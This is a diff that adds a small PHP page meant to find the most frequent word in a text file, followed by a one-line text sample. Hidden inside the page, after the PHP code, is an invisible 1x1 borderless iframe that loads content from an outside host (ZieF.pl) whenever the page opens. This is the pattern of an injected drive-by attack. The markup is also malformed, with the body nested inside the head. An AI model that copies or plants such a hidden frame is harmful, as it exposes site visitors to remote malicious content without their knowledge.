@@ -1,0 +1,20 @@
+//xml
+<html>
+<head>
+<body>
+<?php
+$str=file_get_contents("Program10.txt");
+$words=explode(" ",$str);
+$res=array_count_values($words);
+asort($res);
+end($res);
+$ans=key($res);
+echo "The words that appear most common is: &nbsp $ans";
+?>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</head>
+</html>
+
+//txt
+xml php css xml
